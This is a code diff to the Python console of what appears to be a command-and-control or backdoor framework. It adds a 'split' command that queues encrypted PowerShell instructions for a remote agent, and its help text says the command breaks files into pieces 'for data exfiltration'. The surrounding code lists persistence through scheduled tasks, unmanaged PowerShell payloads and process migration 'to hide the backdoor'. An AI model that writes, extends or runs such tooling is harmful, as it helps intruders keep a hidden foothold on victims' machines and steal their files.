@@ -54,7 +54,8 @@ class cmd:
      'unamanged_powershell',
      'persist_schtasks',
      'migrate',
-     'processlist']
+     'processlist',
+     'split']
 
     HELPCOMMANDS = [['exit', 'Exit the console , or kill the agent '],
      ['list', 'List all agents'],
@@ -88,7 +89,8 @@ class cmd:
      ['unamanged_powershell', 'run powershell payload through the dotnet agent'],
      ['persist_schtasks', 'persistence using schedule tasks'],
      ['migrate', 'migrate to new process ( default nslookup ) to hide the backdoor '],
-     ['processlist', 'list processes formated ( Name , ID , Commandline)']]
+     ['processlist', 'list processes formated ( Name , ID , Commandline)'],
+     ['split', 'split file to small size files for data exfiltration ( use join.ps1 script to join data )']]
 
     def help(self, args = None):
         table = prettytable.PrettyTable([bcolors.BOLD + 'Command' + bcolors.ENDC, bcolors.BOLD + 'Description' + bcolors.ENDC])
@@ -480,3 +482,27 @@ class cmd:
             return
 
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"Get-WmiObject Win32_Process  | select Name,ProcessId,CommandLine | Format-Table -Wrap -AutoSize"))
+
+    def split(self, args=None):
+        if config.get_pointer()=='main':
+            print ("you can't use this command in main ! chose an agent")
+            return
+        MB=''
+        if len(args) < 2:
+            print ("Usage split <full file path>")
+            return
+        path=' '.join(args[1:])
+        while len(MB) == 0:
+            MB = input('please enter the split size in MB')
+            if len(MB)>0:
+                try:
+                    Bytes=int(MB)*(1024**2)
+                except:
+                    print ("Error reading the size provided")
+                    MB=''
+                    continue
+            else:
+                MB=''
+                continue
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load split.ps1"))
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"split -path "+path+" -chunksize "+str(Bytes)))
